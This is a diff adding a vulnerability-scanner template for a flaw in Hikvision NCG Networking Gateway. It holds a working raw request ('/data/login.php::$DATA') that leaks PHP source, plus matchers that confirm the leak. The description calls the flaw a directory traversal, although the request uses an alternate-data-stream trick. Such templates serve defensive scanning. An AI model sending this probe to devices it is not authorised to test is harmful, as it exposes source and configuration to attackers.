@@ -1,0 +1,31 @@
+id: hikvision-ncg-directory-traversal
+info:
+  name: Hikvision NCG Networking Gateway Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Hikvision NCG Networking Gateway is vulnerable to a directory traversal issue in the login.php file, allowing attackers to read sensitive system files such as configuration files.
+  tags: directory-traversal
+  reference:
+    - https://forum.butian.net/share/305
+
+http:
+  - raw:
+      - |
+        GET /data/login.php::$DATA HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "getElementsByTagName('user');"
+          - "<?php"
+        condition: and
+        part: body
+      - type: word
+        words:
+          - "<?php"
+          - "new domxpath($dom);"
+        condition: and
+        part: body
